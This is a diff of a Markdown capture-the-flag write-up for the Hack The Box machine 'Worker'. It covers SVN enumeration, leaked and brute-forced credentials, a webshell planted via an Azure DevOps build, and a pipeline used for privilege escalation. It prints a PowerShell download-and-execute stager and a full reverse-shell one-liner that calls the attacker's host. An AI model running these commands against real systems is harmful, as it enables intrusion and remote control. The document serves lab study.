@@ -2,28 +2,27 @@
 
 ## Overview
 
-![](<machine>.infocard.png)
+![](https://github.com/zweilosec/htb-writeups/tree/1d1966b50bcba2e0fb7d3d9897c582c3ca64b5d4/windows-machines/medium/machine%3E.infocard.png)
 
 Short description to include any strange things to be dealt with
 
 ## Useful Skills and Tools
 
-#### https://wadcoms.github.io/
+#### [https://wadcoms.github.io/](https://wadcoms.github.io/)
 
 > WADComs is an interactive cheat sheet, containing a curated list of offensive security tools and their respective commands, to be used against Windows/AD environments.
 
 #### Useful thing 2
 
-- description with generic example
+* description with generic example
 
 ## Enumeration
 
 ### Nmap scan
 
-
 I started my enumeration with an nmap scan of `10.10.10.203`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/worker]
 └─$ nmap -sCV -n -p- -v 10.10.10.203                                                                   
 Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-28 18:40 EST
@@ -88,16 +87,15 @@ Nmap done: 1 IP address (1 host up) scanned in 113.30 seconds
 
 nothing but default IIS on port 80, dirbuster reveals nothing of use
 
-http://svnbook.red-bean.com/
+[http://svnbook.red-bean.com/](http://svnbook.red-bean.com/)
 
-http://svnbook.red-bean.com/en/1.7/svn-book.pdf
+[http://svnbook.red-bean.com/en/1.7/svn-book.pdf](http://svnbook.red-bean.com/en/1.7/svn-book.pdf)
 
->To get a working copy, you must check out some subtree of the repository. (The term check out may sound like it has something todo with locking or reserving resources, but it doesn't; it simply creates a working copy of the project for you.) For example, if you check out /calc, you will get a working copy like this:
->`$ svn checkout http://svn.example.com/repos/calcA    calc/MakefileA    calc/integer.cA    calc/button.cChecked out revision 56.`
+> To get a working copy, you must check out some subtree of the repository. \(The term check out may sound like it has something todo with locking or reserving resources, but it doesn't; it simply creates a working copy of the project for you.\) For example, if you check out /calc, you will get a working copy like this: `$ svn checkout http://svn.example.com/repos/calcA calc/MakefileA calc/integer.cA calc/button.cChecked out revision 56.`
 
 installed subversion `sudo apt install subversion`
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/worker]
 └─$ svn checkout http://10.10.10.203 
 svn: E170013: Unable to connect to a repository at URL 'http://10.10.10.203'
@@ -106,7 +104,7 @@ svn: E175003: The server at 'http://10.10.10.203' does not support the HTTP/DAV 
 
 Next found there is a SVN protocol
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/worker]
 └─$ svn checkout svn://10.10.10.203
 A    dimension.worker.htb
@@ -179,19 +177,18 @@ A    moved.txt
 Checked out revision 5.
 ```
 
-there were quite a few files here, and a subdomain `dimension.worker.htb`.  I added `worker.htb` and `dimension.worker.htb` to my hosts file
+there were quite a few files here, and a subdomain `dimension.worker.htb`. I added `worker.htb` and `dimension.worker.htb` to my hosts file
 
-```
+```text
 This repository has been migrated and will no longer be maintaned here.
 You can find the latest version at: http://devops.worker.htb
 
 // The Worker team :)
 ```
 
-The file `moved.txt` contained a message stating that the repo has been moved to another castle `devops.worker.htb`.  I added this one to my hosts file as well
+The file `moved.txt` contained a message stating that the repo has been moved to another castle `devops.worker.htb`. I added this one to my hosts file as well
 
-```
-
+```text
                                                 <!-- Work -->
                                                         <article id="work">
                                                                 <h2 class="major">Work</h2>
@@ -207,7 +204,7 @@ The file `moved.txt` contained a message stating that the repo has been moved to
 
 The file `index.html` contained another list of subdomains; again added to hosts
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/worker/devops]
 └─$ svn log svn://devops.worker.htb
 ------------------------------------------------------------------------
@@ -235,7 +232,7 @@ First version
 
 Using the `log` command found the commit notes that described some of the progress that had been made
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/worker/devops]
 └─$ svn diff -r 1                                                                                   1 ⨯
 Index: moved.txt
@@ -248,7 +245,7 @@ Index: moved.txt
 +
 +// The Worker team :)
 +
-                                                                                                        
+
 ┌──(zweilos㉿kali)-[~/htb/worker/devops]
 └─$ svn diff -r 2
 Index: deploy.ps1
@@ -272,7 +269,7 @@ Index: moved.txt
 +
 +// The Worker team :)
 +
-                                                                                                        
+
 ┌──(zweilos㉿kali)-[~/htb/worker/devops]
 └─$ svn diff -r 3
 Index: deploy.ps1
@@ -298,7 +295,7 @@ Index: moved.txt
 +
 +// The Worker team :)
 +
-                                                                                                        
+
 ┌──(zweilos㉿kali)-[~/htb/worker/devops]
 └─$ svn diff -r 4
 Index: moved.txt
@@ -311,27 +308,27 @@ Index: moved.txt
 +
 +// The Worker team :)
 +
-                                                                                                        
+
 ┌──(zweilos㉿kali)-[~/htb/worker/devops]
 └─$ svn diff -r 5
 ```
 
 I checked the changes that had been made in each revision, and found that at one point a username and password had been hardcoded in the file `deploy.ps1`
 
-```powershell
+```text
 -$user = "nathen" 
 -$plain = "wendel98"
 ```
 
-This credential set did not work for logging into the devops page, not for WinRM.  Reset the box and login worked for the devops page, still not for WinRM
+This credential set did not work for logging into the devops page, not for WinRM. Reset the box and login worked for the devops page, still not for WinRM
 
-https://azure.microsoft.com/en-us/resources/videos/smarthotel360-demo-app-overview/
+[https://azure.microsoft.com/en-us/resources/videos/smarthotel360-demo-app-overview/](https://azure.microsoft.com/en-us/resources/videos/smarthotel360-demo-app-overview/)
 
 found 3 usernames, and a possible password `w45ty45t`
 
 ## Initial Foothold
 
-```
+```text
 TF402455: Pushes to this branch are not permitted; you must use a pull request to update this branch.
 ```
 
@@ -339,21 +336,15 @@ Tried to push a file uploaded through the web portal but got the above message
 
 The build takes so long that the cleanup takes place too quickly to do anything...
 
-lots of screenshots and descriptsion - had to:
-1. create new branch
-2. upload file to new branch
-3. add work item to commit
-4. approve commit
-5. wait for build to complete
-6. navigate to webshell
+lots of screenshots and descriptsion - had to: 1. create new branch 2. upload file to new branch 3. add work item to commit 4. approve commit 5. wait for build to complete 6. navigate to webshell
 
-```powershell
+```text
 powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.15.98:8909/revShell.ps1')"
 ```
 
 Put this command into the webshell input as a stager to get my reverse shell powershell script from my waiting python http server
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/worker]
 └─$ python3 -m http.server 8909
 Serving HTTP on 0.0.0.0 port 8909 (http://0.0.0.0:8909/) ...
@@ -362,13 +353,13 @@ Serving HTTP on 0.0.0.0 port 8909 (http://0.0.0.0:8909/) ...
 
 got connection to my waiting webserver which hosted a reverse shell ps1 script
 
-```
+```text
 $client = New-Object System.Net.Sockets.TCPClient("10.10.15.98",8099);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
-My powershell script consisted of a reverse shell one-liner found on https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3#gistcomment-3391254
+My powershell script consisted of a reverse shell one-liner found on [https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3\#gistcomment-3391254](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3#gistcomment-3391254)
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/worker]
 └─$ script                                                                                          1 ⨯
 Script started, output log file is 'typescript'.
@@ -425,7 +416,7 @@ SeImpersonatePrivilege is interesting
 
 ### Further enumeration
 
-```
+```text
 PS C:\users\restorer> net user
 
 User accounts for \\
@@ -569,7 +560,7 @@ The command completed with one or more errors.
 
 net user showed a very long list of usernames
 
-```
+```text
 PS C:\windows\system32\inetsrv> ls \users
 
 
@@ -588,9 +579,9 @@ d-----       2020-07-08     19:22                robisl
 
 however there were only three user folder: `robisl`, `restorer`, and `Administrator`
 
-https://www.thewindowsclub.com/list-drives-using-command-prompt-powershell-windows
+[https://www.thewindowsclub.com/list-drives-using-command-prompt-powershell-windows](https://www.thewindowsclub.com/list-drives-using-command-prompt-powershell-windows)
 
-```
+```text
 PS C:\users\restorer> get-psdrive -psprovider filesystem
 
 Name           Used (GB)     Free (GB) Provider      Root                                               CurrentLocation
@@ -601,7 +592,7 @@ W                   2,52         17,48 FileSystem    W:\
 
 There was a second logical disk attached to the machine
 
-```
+```text
 PS W:\> ls 
 
 
@@ -618,7 +609,7 @@ d-----       2020-06-20     16:04                svnrepos
 
 It looked like this is where the svn repos were stored
 
-```
+```text
 PS W:\> tree sites
 Folder PATH listing for volume Work
 Volume serial number is E82A-AEA8
@@ -710,9 +701,9 @@ W:\SITES
     ????images
 ```
 
-I found the data for the websites in the `sites` folder, 
+I found the data for the websites in the `sites` folder,
 
-```
+```text
 PS W:\> tree /F svnrepos
 Folder PATH listing for volume Work
 Volume serial number is E82A-AEA8
@@ -776,10 +767,9 @@ W:\SVNREPOS
             db.lock
 ```
 
-
 ### Finding user creds
 
-```
+```text
 PS W:\svnrepos\www\conf> cat passwd
 ### This file is an example password file for svnserve.
 ### Its format is similar to that of svnserve.conf. As shown in the
@@ -829,19 +819,19 @@ sapket = hamburger
 sarkil = friday
 ```
 
-In the folder `W:\svnrepos\www\conf` there was a file `passwd` that contained a list of usernames and passwords.  This looked like a good time to brute force WinRM
+In the folder `W:\svnrepos\www\conf` there was a file `passwd` that contained a list of usernames and passwords. This looked like a good time to brute force WinRM
 
-https://github.com/mchoji/winrm-brute
+[https://github.com/mchoji/winrm-brute](https://github.com/mchoji/winrm-brute)
 
-used winrm-brute to 
+used winrm-brute to
 
 ### User.txt
 
-```
+```text
 [SUCCESS] user: robisl password: wolves11
 ```
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/worker/winrm-brute]
 └─$ evil-winrm -u robisl -p wolves11 -i 10.10.10.203                                      
 
@@ -887,7 +877,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 
 Using evil-winrm I was able to login with the password specified for `robisl`
 
-```
+```text
 *Evil-WinRM* PS C:\Users\robisl\Documents> cd ../Desktop
 *Evil-WinRM* PS C:\Users\robisl\Desktop> ls
 
@@ -910,15 +900,15 @@ On the user's desktop I found the `user.txt` flag
 
 ### Enumeration as `robisl`
 
-After searching high and low, and enumerating as much as I could, I didn't find anything useful.  
+After searching high and low, and enumerating as much as I could, I didn't find anything useful.
 
 pic
 
-I tried switching users in the `devops` page I had open, and received an errormoessage.  I decided to try `robisl`'s credentials on a fresh `deveops` page after closing it, and was logged in to a different project
+I tried switching users in the `devops` page I had open, and received an errormoessage. I decided to try `robisl`'s credentials on a fresh `deveops` page after closing it, and was logged in to a different project
 
-https://azure.microsoft.com/en-us/services/devops/
+[https://azure.microsoft.com/en-us/services/devops/](https://azure.microsoft.com/en-us/services/devops/)
 
-https://docs.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops
+[https://docs.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops](https://docs.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops)
 
 > Azure Pipelines provides a quick, easy, and safe way to automate building your projects and making them available to users.
 
@@ -926,7 +916,7 @@ This sounds like an easy way to get code execution...I wonder if there is a way 
 
 New Pipeline - Azure Repos Git - PartsUnlimited - Starter Pipeline
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/worker]
 └─$ python3 -m http.server 8909
 Serving HTTP on 0.0.0.0 port 8909 (http://0.0.0.0:8909/) ...
@@ -935,12 +925,12 @@ Serving HTTP on 0.0.0.0 port 8909 (http://0.0.0.0:8909/) ...
 
 ### Getting a shell
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/worker]
 └─$ nc -lvnp 8099                                                                                   1 ⨯
 listening on [any] 8099 ...
 connect to [10.10.15.98] from (UNKNOWN) [10.10.10.203] 51544
-       
+
 PS W:\agents\agent11\_work\8\s> whoami /all
 
 USER INFORMATION
@@ -1013,10 +1003,9 @@ SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for anot
 PS W:\agents\agent11\_work\8\s>
 ```
 
-
 ### Root.txt
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/worker]
 └─$ nc -lvnp 8099                                         
 listening on [any] 8099 ...
@@ -1033,3 +1022,4 @@ Had to recreate my session as some automated process deleted it after a short ti
 Thanks to [`<box_creator>`](https://www.hackthebox.eu/home/users/profile/<profile_num>) for something interesting or useful about this machine.
 
 If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).
+
